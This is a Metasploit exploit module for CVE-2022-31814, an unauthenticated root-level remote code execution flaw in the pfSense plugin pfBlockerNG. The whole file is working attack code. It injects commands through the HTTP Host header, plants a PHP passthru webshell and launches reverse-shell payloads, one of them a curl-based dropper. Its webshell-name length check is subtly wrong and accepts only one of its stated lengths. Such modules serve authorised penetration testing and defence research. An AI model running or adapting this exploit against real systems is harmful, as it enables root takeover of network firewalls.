##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'pfSense plugin pfBlockerNG unauthenticated RCE as root',
        'Description' => %q{
          pfBlockerNG is a popular pfSense plugin that is not installed by default. Itâ€™s generally used to
          block inbound connections from whole countries or IP ranges. Versions equal to and below 2.1.4_26 are affected
          by an unauthenticated RCE vulnerability that results in root access.
        },
        'Author' => [
          'IHTeam', # discovery
          'jheysel-r7' # module
        ],
        'References' => [
          [ 'CVE', '2022-31814' ],
          [ 'URL', 'https://www.ihteam.net/advisory/pfblockerng-unauth-rce-vulnerability/']
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Privileged' => false,
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_openssl'
              },
              'Payload' => {
                'Append' => ' & disown'
              }
            }
          ],
          [
            'BSD Dropper',
            {
              'Platform' => 'bsd',
              'Arch' => [ARCH_X64],
              'Type' => :bsd_dropper,
              'CmdStagerFlavor' => [ 'curl' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'bsd/x64/shell_reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 1,
        'DisclosureDate' => '2022-09-05',
        'Notes' => {
          'Stability' => [ CRASH_SERVICE_DOWN ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION, ]
        }
      )
    )

    register_options(
      [
        OptString.new('WEBSHELL_NAME', [
          false, 'The name of the uploaded webshell. This value is randomly set with a specific length if unset. The webshell filename has to be a specific length in order for the exploit to be successful, either: 5, 8, 11, 14, 17... (not including the .php exetention)  ', nil
        ])
      ]
    )
  end

  def check
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/pfblockerng/www/index.php'),
      'method' => 'GET'
    )

    return Exploit::CheckCode::Safe('Could not connect to web service - no response') if res.nil?
    return Exploit::CheckCode::Safe("pfBlockerNG does not appear to be installed - (response code: #{res.code})") if res.code != 200

    if res.body.include?('GIF') && res.headers['Content-Type'] == 'image/gif'
      Exploit::CheckCode::Appears
    end
  end

  def execute_command(cmd, _opts = {})
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "/#{@webshell_name}?c=#{Rex::Text.uri_encode(cmd)}"),
      'headers' => {
        'Accept' => '*/*',
        'Accept-Language' => 'en-US,en;q=0.5',
        'Content-Encoding' => 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection' => 'keep-alive'
      }
    })
  end

  def exploit
    print_status 'Uploading shell...'
    # The webshell filename has to be a specific length in order for the exploit to be successful, either: 5, 8, 11, 14, 17...
    @webshell_name = datastore['WEBSHELL_NAME'] || "#{Rex::Text.rand_text_alpha([5, 8, 11, 14, 17].sample)}.php"

    fail_with(Failure::BadConfig, 'WEBSHELL_NAME, is not the correct length, please the module docs for more info') unless @webshell_name.length == (9 || 12 || 15 || 18 || 21)

    print_status("Webshell name is: #{@webshell_name}")

    web_shell_contents = <<~EOF
      <?$a=fopen("/usr/local/www/#{@webshell_name}","w") or die();$t='<?php print(passthru( $_GET["c"]));?>';fwrite($a,$t);fclose( $a);?>
    EOF

    send_request_raw(
      'uri' => normalize_uri(target_uri.path, '/pfblockerng/www/index.php'),
      'headers' => {
        'Host' => "' *; echo '#{Rex::Text.encode_base64(web_shell_contents)}'|python3.8 -m base64 -d | php; '"
      }
    )

    sleep datastore['WfsDelay']
    check_for_shell = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "/#{@webshell_name}?c=id")
    )

    fail_with(Failure::UnexpectedReply, 'Error uploading shell, the system is likely patched ') if check_for_shell.nil? || check_for_shell.body.nil?

    if check_for_shell.body.include?('uid=0(root) gid=0(wheel)')
      print_good("Upload succeeded, response from running id command: #{check_for_shell.body}")
    else
      fail_with(Failure::UnexpectedReply, 'Error uploading shell, the system is likely patched')
    end

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :bsd_dropper
      execute_cmdstager
    end
  end
end
